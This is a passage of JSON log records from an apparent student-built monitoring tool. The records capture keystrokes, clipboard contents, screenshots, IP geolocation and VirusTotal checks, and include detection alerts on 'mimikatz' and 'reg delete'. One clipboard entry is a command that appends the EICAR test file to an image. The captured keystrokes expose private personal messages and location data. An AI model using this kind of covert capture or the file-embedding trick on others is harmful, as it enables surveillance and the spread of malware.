"52e844202e6c78612a823e35f67a22c20225681c8797e0cd56c207bf12599baf", "_raw_log_hash": "d5c8134637747f588106658ffad9e065e6de738f74d41831404d1d883525a04a"}
{"timestamp": "2025-06-22T10:27:21.498980+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (817 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "f680055ab91b5448c4b071d6698369b6bc1ce950cb24183e4be223b0bb259235", "_raw_log_hash": "65c53ea22a7e25acebd01cc8ae4deb22a86001a335a1a7e6f716d7f1c1f95f42"}
{"timestamp": "2025-06-22T14:32:28.115343+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "elas[ctrl_l]\u000610[right][right][right][right][right][right][right][right][right][left][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE]locaokay baby happy nomming[ENTER]", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (818 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "7db58cd5263b50898447829ab8f125fcbac17a8bbd9892b766ee79cce5099007", "_raw_log_hash": "587aef61ef97d5afab9a96f0db56ef320d3eb668028d6e1f371bfe623417857e"}
{"timestamp": "2025-06-22T14:34:54.732165+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "stop[shift_r]:s[BACKSPACE][shift_r]_snakey[ENTER]", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (818 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "e9f2e044faa1b2b6f0e39eab42b552d446cefe41a641a35c0a5eaa0f9d810c73", "_raw_log_hash": "fde02307a1867acc0124817525813b7c6e10ef131d8fffce1d5d513e1137f783"}
{"timestamp": "2025-06-22T16:09:34.966086+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "\\begin{figure}\n    \\centering\n    \\includegraphics[width=1\\linewidth]{ML.png}\n    \\caption{Machine Learning has started towards future work prospects}\n    \\label{fig:ML}\n\\end{figure}\n", "keystrokes": "stop[shift_r]_snakey[ENTER]", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (818 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c9586a828ab16e79f8cd67b9a8b83198270d2e3e11e6a3bfdf5daa10c14084ab", "screenshot_hash": "72413589b2181223237768607eb29218f40b6bba1bc1d24d027b4a1eb67d25b4", "_raw_log_hash": "ca24abc1e7657b9faadbc6c6d91d5c69731b2a63853e68aedebd91d689e3ec4f"}
{"timestamp": "2025-06-22T20:33:58.851163+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "mimikatz", "keystrokes": "[ctrl_l][ctrl_l][ctrl_l][ctrl_l][ctrl_l][ctrl_l][ctrl_l][ctrl_l][ctrl_l]\u0003sensiv[BACKSPACE]tive cmd command[ENTER][ctrl_l][ctrl_l][ctrl_l][ctrl_l][ctrl_l][ctrl_l][ctrl_l][ctrl_l][ctrl_l][ctrl_l][ctrl_l][ctrl_l][ctrl_l][ctrl_l][ctrl_l][ctrl_l][BACKSPACE]mimikatz taskkill[ctrl_l]\u0003[BACKSPACE]", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT", "Sensitive CMD command detected in clipboard: 'mimikatz...' (matched: 'mimikatz')"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (818 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "f2e589860108e1dedfae546aa4ffde86c653da28a6c2b1816432cafbf1512d36", "screenshot_hash": "ae631641e8a12ff45499c36f19c57611de664deffdc3ebed6856fa1a550cd53f", "_raw_log_hash": "f64fd94318cd7a0cb6b6fa3c3ba9d61cf746c95ea9b31a9b3088ed65edea66f2"}
{"timestamp": "2025-06-22T20:36:26.975142+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "mimikatz taskkill", "keystrokes": "stop[shift_r]_snakey[ENTER]", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT", "Sensitive CMD command detected in clipboard: 'mimikatz taskkill...' (matched: 'mimikatz')"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (818 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "4dc6b581f09031563b71c6bc677ca9318b55918f4a3ee7e3a2dfe5a2242afb55", "screenshot_hash": "93702d43ed1855ee44487f16a5198a4042a0d19782e0b5f34c5ddc6a066ac50e", "_raw_log_hash": "9b32273c038569faa6ff7d043cee6f1ea0b627210db4dd059ecfab46bfc8572d"}
{"timestamp": "2025-06-22T22:05:59.047245+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "cmd[ctrl_l]\u0003 reaction[ENTER]", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (818 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "f9b8e786d779ed482d9dbd4bd3a3afaea2dca7d6cb8a530c739002de47d6a240", "_raw_log_hash": "515ce964586cbbfa4f73e49c0caea5b1fc3e87c9d0b1dc2eda807503d89c42f2"}
{"timestamp": "2025-06-22T22:08:56.791016+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "reg delete", "keystrokes": "[print_screen][esc][print_screen][print_screen][print_screen][print_screen]noooo ,y nany[BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE]m,[BACKSPACE]y nany asr[BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE]baby argh the call fell b[BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE]got hung up beca<us[BACKSPACE][BACKSPACE][BACKSPACE]use of testing snakey [shift_r]:cat[right][right][right][ENTER][ENTER]i had to connect myself to a [caps_lock]vpn[shift][caps_lock] o [BACKSPACE][BACKSPACE]to test b[BACKSPACE]for network hpo[BACKSPACE][BACKSPACE]opping and it hung up our cally my baby awww no [shift_r]:cat[right][right][right][ENTER] im sorry baby we were cally for son [BACKSPACE][BACKSPACE] longy too[ENTER]", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x0000029472EBE210>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))", "Sensitive CMD command detected in clipboard: 'reg delete...' (matched: 'reg delete')"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (818 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "f6e4f5d3c2be6ee947b69b1e6ae63e42811a17605f2a7a2c7bd08a98c2502816", "screenshot_hash": "f64c4e0657933b9f2a73119fe0b53f156b91939a10d28c146cc22ecb9e333ef2", "_raw_log_hash": "f69ad1013f3852c2cbd219e6fbafb1f565a92b49a4480f3d54d9fe0e2efe7fcc"}
{"timestamp": "2025-06-22T22:12:09.874240+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "185.252.220.126", "country": "RO", "region": "Bucure\u0219ti", "city": "Bucharest", "isp": "AS9009 M247 Europe SRL", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "reg delete", "keystrokes": "stop[shift_r]_snakley[BACKSPACE][BACKSPACE][BACKSPACE]ey[ENTER]", "screenshot_taken": true, "alerts": ["Access from untrusted country: RO", "Country changed since last session: PT -> RO", "Sensitive CMD command detected in clipboard: 'reg delete...' (matched: 'reg delete')"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (818 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "f6e4f5d3c2be6ee947b69b1e6ae63e42811a17605f2a7a2c7bd08a98c2502816", "screenshot_hash": "0e819dac08cf003947ea6719cc4723e31d56e1f210e5734c7121736cd3f0a5de", "_raw_log_hash": "9ff834512401b5b726bfec58711c974e84de92c98ae9be5b2c1ac41885118517"}
{"timestamp": "2025-06-22T22:41:29.175497+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "a37f9d50ecd405dac5dc90c1dabc10b1239b54116f54b5ef3ed74c8276ad19ab", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT", "Country changed since last session: RO -> PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (820 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "5f77fe82c665b0171495f14b9efa983a1c7c4528f3346defe9321e2720fe372b", "screenshot_hash": "772b510da11af0e7d32ab0e5e0c6ea24ca7d8039ecc06c2352e77aefef379650", "_raw_log_hash": "1a7231942568e157b38270e522a37454f43e9b2c4d0284e363fee7464b654a4d"}
{"timestamp": "2025-06-22T22:43:57.536913+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "a37f9d50ecd405dac5dc90c1dabc10b1239b54116f54b5ef3ed74c8276ad19ab", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (820 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "5f77fe82c665b0171495f14b9efa983a1c7c4528f3346defe9321e2720fe372b", "screenshot_hash": "f33712379f1e326bc560d09688cad90a9d3cc385af5d29e2cce493e0383bdf25", "_raw_log_hash": "0e6040c11e24df6b4baabe8ed8064afad50be5f090aa98919080a3120330dd66"}
{"timestamp": "2025-06-22T22:46:24.218800+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "a37f9d50ecd405dac5dc90c1dabc10b1239b54116f54b5ef3ed74c8276ad19ab", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (820 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "5f77fe82c665b0171495f14b9efa983a1c7c4528f3346defe9321e2720fe372b", "screenshot_hash": "f88ff5026c5430348269a173685fa7a8c18fdb08b64ffb1eb3158052d3aa0f6e", "_raw_log_hash": "15c01fdaafcc845cadc134ddee2b4256b828484c2661bcecf27705a2cb4905f5"}
{"timestamp": "2025-06-22T22:48:51.059884+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "a37f9d50ecd405dac5dc90c1dabc10b1239b54116f54b5ef3ed74c8276ad19ab", "keystrokes": "stop[shift_r]_snakey[ENTER]", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (820 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "5f77fe82c665b0171495f14b9efa983a1c7c4528f3346defe9321e2720fe372b", "screenshot_hash": "b6a6271a1ce59dec180abe39f8873dd8216af53ac959b6ce8021231a2e6ff20a", "_raw_log_hash": "1c385ef5cfb2744fa1c58149feb80407c9823a31042f06b21ab00ba40ce49e62"}
{"timestamp": "2025-06-22T22:59:13.388135+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "rusTotal File lookup failed (404 Not Found) for hash b6a6271a1ce59dec180abe39f8873dd8216af53ac959b6ce8021231a2e6ff20a from C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\\screenshot.png. File likely not previously analyzed by VT.", "keystrokes": "what if i open the infected image on the [BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE]when snakey is active would that do[ENTER]it has the eicar would it harm my pc[ENTER]", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (820 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "108c3e746183ed5896c4d0be3b65e8f3be51811c78f1d86d65c6d8eacc03327a", "screenshot_hash": "2fab08e8dee1974bb6616b9e117d877a4cf2189f4fc6dbdf6fc83c14b11039c8", "_raw_log_hash": "5d13004d30b0c9c21892bafce3da9b1d54626e0f84e865e602b41d0539d90f5f"}
{"timestamp": "2025-06-22T23:01:40.018093+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "rusTotal File lookup failed (404 Not Found) for hash b6a6271a1ce59dec180abe39f8873dd8216af53ac959b6ce8021231a2e6ff20a from C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\\screenshot.png. File likely not previously analyzed by VT.", "keystrokes": "[ctrl_l]\u0003", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (820 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "108c3e746183ed5896c4d0be3b65e8f3be51811c78f1d86d65c6d8eacc03327a", "screenshot_hash": "5a98239e76b65ffb277e376db6ff139884b784e3a0f92b28e1d1067f90cd1974", "_raw_log_hash": "dcfa39bf15fe0003f6745a241182bd03012b1915c1418e9cda0ce67ff8ef0587"}
{"timestamp": "2025-06-22T23:04:06.933609+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "http://g7ejphhubv5idbbu3hb3wawrs5adw7tkx7yjabnf65xtzztgg4hcsqqd.onion/", "keystrokes": "stop[shift_r]_snakey[ENTER]", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT", "VirusTotal flagged clipboard URL as malicious: 2 positives."], "virustotal": {"clipboard_url": {"malicious": 2, "suspicious": 1, "undetected": 28, "harmless": 65, "timeout": 0}}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (820 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "dd685ea71a3decdd1abe0a0766937ab22d59e5d1360cae6cb4b05268e38b2f5f", "screenshot_hash": "cb80774cd58dc93dce29810d9d10f6fa6d7ca679b62d354532b53d7f7dc50ed9", "_raw_log_hash": "6788be9ae42219034acfd9d8bcbed6b121a2542474d853874b61793f349143d3"}
{"timestamp": "2025-06-23T09:15:38.739962+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "\"C:/Users/ktmdu/Downloads/infected.png\"", "keystrokes": "[left][left]as p\u00b4ag [right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][right][ENTER][ctrl_l]\u0003[ctrl_l]\u0016[ENTER]  [shift_r]`a primeira vista as primeiras parecem be [BACKSPACE][BACKSPACE][BACKSPACE]me bem [shift_r](?)[ENTER]ohh[BACKSPACE] o[BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE]ohh okay okay [caps_lock]p[caps_lock]rofessor j\u00b4a vou tamb\u00b4em tentar perceber o que se passo [BACKSPACE]u, estou apenas a adicionar o ultimo test que fiz [ENTER]infected[ENTER]", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (820 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "0a551b8e05f46aa7384f185d332859bc0bb59dab326998a5e416faf1e8c55107", "screenshot_hash": "9df8720cd876c15774f30382f5fed6ae6aab7eca95e5bf2b3e6073aa775e300b", "_raw_log_hash": "7701c199a724fc657dfdc2f8bef49150bd693b665f5e54e0d2b11e34727a77d3"}
{"timestamp": "2025-06-23T09:18:05.963978+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "VirusTotal File lookup failed (404 Not Found) for hash 9df8720cd876c15774f30382f5fed6ae6aab7eca95e5bf2b3e6073aa775e300b from C:/Users/ktmdu/Downloads/infected.png. File likely not previously analyzed by VT.\r\n[2025-06-23T10:15:41.150155] [INFO] No VirusTotal result for screenshot or scan failed.", "keystrokes": "[BACKSPACE]infected[up][up][ENTER]it still didnt work manually, is there a play[BACKSPACE]ce i can find infected images to test[shift_r]?[ENTER]", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (821 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "985d83674def1dbe3d3351d79dd048b7d794244121075821574deceb7d4f8766", "screenshot_hash": "d00fc945b87f2f7ed6e2031235f22f9b609bd062489f360097d5b877d9410671", "_raw_log_hash": "2fa948220cc4940789f14185ef46ea367efcb90b2dd3f08d7f4da6aca66fb81f"}
{"timestamp": "2025-06-23T09:20:32.479309+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "VirusTotal File lookup failed (404 Not Found) for hash 9df8720cd876c15774f30382f5fed6ae6aab7eca95e5bf2b3e6073aa775e300b from C:/Users/ktmdu/Downloads/infected.png. File likely not previously analyzed by VT.\r\n[2025-06-23T10:15:41.150155] [INFO] No VirusTotal result for screenshot or scan failed.", "keystrokes": "[ctrl_l][ctrl_l][ctrl_l][ctrl_l][ctrl_l][ctrl_l]\u0003[ctrl_l]\u0016[ENTER][ctrl_l]\u0003[ctrl_l]\u0016[BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE]png[ctrl_l]\u0003[ctrl_l]\u0016[shift_r][ENTER][ENTER][ENTER]its asking me to seatc[BACKSPACE][BACKSPACE]rch via syntax[ENTER][ctrl_l]\u0016[ctrl_l]\u0016[BACKSPACE][BACKSPACE][BACKSPACE][caps_lock]jpg[ENTER]", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (820 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "985d83674def1dbe3d3351d79dd048b7d794244121075821574deceb7d4f8766", "screenshot_hash": "fe02e9850f620e1923beaef9709c358435e548201b024c4b916664cb4dabc748", "_raw_log_hash": "f03e9711d27abc5822c4db88755f4023c90e1c8723968179f8e3425abd32bb51"}
{"timestamp": "2025-06-23T09:22:58.866038+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "file_type:PNG\r\n", "keystrokes": "[ctrl_l]\u0003[ctrl_l]\u0016[ctrl_l]\u0016[ENTER]can i[BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][caps_lock]an i do this [shift_r]?  [ctrl_l][ctrl_l]\u0016[shift_r][ENTER][ENTER][ENTER]using this command [up][ctrl_l]\u0003[ctrl_l]\u0016[BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE]fi[BACKSPACE][BACKSPACE]testing[ENTER]but even if i do the copy command and it creates a e[BACKSPACE]new hash", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (820 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "4584dbc194c0258a921224887d9a5991589174ca627e1d1aba737cbc9e07bf07", "screenshot_hash": "4b4ea36cc50f527dd874c1d05293fab302703b22a967af089f46696b32e4d2dc", "_raw_log_hash": "4500f308b8105e53643942922ed823a002b1a92c06fe3816f7982a00c6ca21d8"}
{"timestamp": "2025-06-23T09:25:24.733076+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "copy /b test.png + eicar.com infected.png", "keystrokes": "ld still be able to capture it[ENTER]i js[BACKSPACE]ust have to copy the had[BACKSPACE]rmful hash into the test.com and add it to the img right[ENTER]happy training my babyyy[ENTER][ctrl_l]\u0003[ctrl_l]\u0016sandobos win", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (820 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "f6ff292282cc0ab351125190cfda8b78b42ca9de2002090587270b6532886a58", "screenshot_hash": "8c3cdc6dbc2a0bcd60ee3a4a4b19eceee29dc6542ae5dfd71658af7f39ad58ac", "_raw_log_hash": "f976c9b3d44947bd4f3310abf306a222d9c155d874035c5ca04173b6e82ca7fa"}
{"timestamp": "2025-06-23T09:27:51.005376+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "d14cdc62de70cf29ee645dc5b480ec7a5b880d3b0c05882dbd2522282b99ec8e", "keystrokes": "so goody my babyyy mwahhhh[ENTER]i miss you so much[ENTER][caps_lock]p[caps_lock]rofessor [BACKSPACE], o snakey temum[BACKSPACE][BACKSPACE] uma fun\u00e7~ao onde este vai buscar o hash do sc[BACKSPACE]creenshot que capturou e envia-lo para ", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (820 